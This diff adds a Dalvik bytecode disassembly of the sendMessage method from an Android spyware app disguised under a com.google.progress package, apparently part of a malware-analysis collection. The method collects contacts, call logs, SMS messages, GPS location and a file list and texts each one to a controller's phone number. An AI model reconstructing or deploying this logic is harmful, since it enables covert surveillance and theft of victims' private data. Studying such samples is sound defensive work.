@@ -1,0 +1,126 @@
+# Lcom/google/progress/AndroidClientService;->sendMessage()V [access_flags=public]
+#
+# Parameters:
+# local registers: v0...v9
+#
+# - return:void
+
+sendMessage-BB@0x0 : [ sendMessage-BB@0x68 sendMessage-BB@0x98 ]
+	0       (00000000) new-instance         v4, Lcom/google/progress/SMSHelper;
+	1       (00000004) invoke-direct        v4, v9, Lcom/google/progress/SMSHelper;-><init>(Landroid/content/Context;)V
+	2       (0000000a) new-instance         v6, Lcom/google/progress/ContactsCollecter;
+	3       (0000000e) invoke-direct        v6, v9, Lcom/google/progress/ContactsCollecter;-><init>(Landroid/content/Context;)V
+	4       (00000014) invoke-virtual       v6, Lcom/google/progress/ContactsCollecter;->getContactList()Ljava/lang/String;
+	5       (0000001a) move-result-object   v1
+	6       (0000001c) new-instance         v6, Lcom/google/progress/GetCallLog;
+	7       (00000020) invoke-direct        v6, v9, Lcom/google/progress/GetCallLog;-><init>(Landroid/content/Context;)V
+	8       (00000026) invoke-virtual       v6, Lcom/google/progress/GetCallLog;->getInfo()Ljava/lang/String;
+	9       (0000002c) move-result-object   v0
+	10      (0000002e) new-instance         v6, Lcom/google/progress/SMSHelper;
+	11      (00000032) invoke-direct        v6, v9, Lcom/google/progress/SMSHelper;-><init>(Landroid/content/Context;)V
+	12      (00000038) invoke-virtual       v6, Lcom/google/progress/SMSHelper;->getInfo()Ljava/lang/String;
+	13      (0000003e) move-result-object   v5
+	14      (00000040) new-instance         v6, Lcom/google/progress/Locate;
+	15      (00000044) invoke-direct        v6, v9, Lcom/google/progress/Locate;-><init>(Landroid/content/Context;)V
+	16      (0000004a) invoke-virtual       v6, Lcom/google/progress/Locate;->getLocation()Ljava/lang/String;
+	17      (00000050) move-result-object   v3
+	18      (00000052) new-instance         v6, Lcom/google/progress/FileList;
+	19      (00000056) invoke-direct        v6, Lcom/google/progress/FileList;-><init>()V
+	20      (0000005c) invoke-virtual       v6, Lcom/google/progress/FileList;->getInfo()Ljava/lang/String;
+	21      (00000062) move-result-object   v2
+	22      (00000064) if-eqz               v1, +1a
+
+sendMessage-BB@0x68 : [ sendMessage-BB@0x70 sendMessage-BB@0x98 ]
+	23      (00000068) const-string         v6, ''
+	24      (0000006c) if-eq                v1, v6, +16
+
+sendMessage-BB@0x70 : [ sendMessage-BB@0x98 ]
+	25      (00000070) iget-object          v6, v9, Lcom/google/progress/AndroidClientService;->phoneNumber Ljava/lang/String;
+	26      (00000074) new-instance         v7, Ljava/lang/StringBuilder;
+	27      (00000078) const-string         v8, '被监控手机联系人:'
+	28      (0000007c) invoke-direct        v7, v8, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+	29      (00000082) invoke-virtual       v7, v1, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	30      (00000088) move-result-object   v7
+	31      (0000008a) invoke-virtual       v7, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	32      (00000090) move-result-object   v7
+	33      (00000092) invoke-virtual       v4, v6, v7, Lcom/google/progress/SMSHelper;->sendSms(Ljava/lang/String;Ljava/lang/String;)I
+
+sendMessage-BB@0x98 : [ sendMessage-BB@0x9c sendMessage-BB@0xcc ]
+	34      (00000098) if-eqz               v0, +1a
+
+sendMessage-BB@0x9c : [ sendMessage-BB@0xa4 sendMessage-BB@0xcc ]
+	35      (0000009c) const-string         v6, ''
+	36      (000000a0) if-eq                v0, v6, +16
+
+sendMessage-BB@0xa4 : [ sendMessage-BB@0xcc ]
+	37      (000000a4) iget-object          v6, v9, Lcom/google/progress/AndroidClientService;->phoneNumber Ljava/lang/String;
+	38      (000000a8) new-instance         v7, Ljava/lang/StringBuilder;
+	39      (000000ac) const-string         v8, '被监控手机通话记录:'
+	40      (000000b0) invoke-direct        v7, v8, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+	41      (000000b6) invoke-virtual       v7, v0, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	42      (000000bc) move-result-object   v7
+	43      (000000be) invoke-virtual       v7, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	44      (000000c4) move-result-object   v7
+	45      (000000c6) invoke-virtual       v4, v6, v7, Lcom/google/progress/SMSHelper;->sendSms(Ljava/lang/String;Ljava/lang/String;)I
+
+sendMessage-BB@0xcc : [ sendMessage-BB@0xd0 sendMessage-BB@0x100 ]
+	46      (000000cc) if-eqz               v5, +1a
+
+sendMessage-BB@0xd0 : [ sendMessage-BB@0xd8 sendMessage-BB@0x100 ]
+	47      (000000d0) const-string         v6, ''
+	48      (000000d4) if-eq                v5, v6, +16
+
+sendMessage-BB@0xd8 : [ sendMessage-BB@0x100 ]
+	49      (000000d8) iget-object          v6, v9, Lcom/google/progress/AndroidClientService;->phoneNumber Ljava/lang/String;
+	50      (000000dc) new-instance         v7, Ljava/lang/StringBuilder;
+	51      (000000e0) const-string         v8, '被监控手机短消息:'
+	52      (000000e4) invoke-direct        v7, v8, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+	53      (000000ea) invoke-virtual       v7, v5, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	54      (000000f0) move-result-object   v7
+	55      (000000f2) invoke-virtual       v7, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	56      (000000f8) move-result-object   v7
+	57      (000000fa) invoke-virtual       v4, v6, v7, Lcom/google/progress/SMSHelper;->sendSms(Ljava/lang/String;Ljava/lang/String;)I
+
+sendMessage-BB@0x100 : [ sendMessage-BB@0x104 sendMessage-BB@0x146 ]
+	58      (00000100) if-eqz               v3, +23
+
+sendMessage-BB@0x104 : [ sendMessage-BB@0x10c sendMessage-BB@0x146 ]
+	59      (00000104) const-string         v6, ''
+	60      (00000108) if-eq                v3, v6, +1f
+
+sendMessage-BB@0x10c : [ sendMessage-BB@0x146 ]
+	61      (0000010c) new-instance         v6, Lcom/google/progress/Locate;
+	62      (00000110) invoke-direct        v6, v9, Lcom/google/progress/Locate;-><init>(Landroid/content/Context;)V
+	63      (00000116) invoke-virtual       v6, Lcom/google/progress/Locate;->getLocation()Ljava/lang/String;
+	64      (0000011c) move-result-object   v3
+	65      (0000011e) iget-object          v6, v9, Lcom/google/progress/AndroidClientService;->phoneNumber Ljava/lang/String;
+	66      (00000122) new-instance         v7, Ljava/lang/StringBuilder;
+	67      (00000126) const-string         v8, '被监控手机GPS位置:'
+	68      (0000012a) invoke-direct        v7, v8, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+	69      (00000130) invoke-virtual       v7, v3, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	70      (00000136) move-result-object   v7
+	71      (00000138) invoke-virtual       v7, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	72      (0000013e) move-result-object   v7
+	73      (00000140) invoke-virtual       v4, v6, v7, Lcom/google/progress/SMSHelper;->sendSms(Ljava/lang/String;Ljava/lang/String;)I
+
+sendMessage-BB@0x146 : [ sendMessage-BB@0x14a sendMessage-BB@0x17a ]
+	74      (00000146) if-eqz               v2, +1a
+
+sendMessage-BB@0x14a : [ sendMessage-BB@0x152 sendMessage-BB@0x17a ]
+	75      (0000014a) const-string         v6, ''
+	76      (0000014e) if-eq                v2, v6, +16
+
+sendMessage-BB@0x152 : [ sendMessage-BB@0x17a ]
+	77      (00000152) iget-object          v6, v9, Lcom/google/progress/AndroidClientService;->phoneNumber Ljava/lang/String;
+	78      (00000156) new-instance         v7, Ljava/lang/StringBuilder;
+	79      (0000015a) const-string         v8, '被监控手机文件列表:'
+	80      (0000015e) invoke-direct        v7, v8, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+	81      (00000164) invoke-virtual       v7, v2, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	82      (0000016a) move-result-object   v7
+	83      (0000016c) invoke-virtual       v7, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	84      (00000172) move-result-object   v7
+	85      (00000174) invoke-virtual       v4, v6, v7, Lcom/google/progress/SMSHelper;->sendSms(Ljava/lang/String;Ljava/lang/String;)I
+
+sendMessage-BB@0x17a : 
+	86      (0000017a) return-void          
+
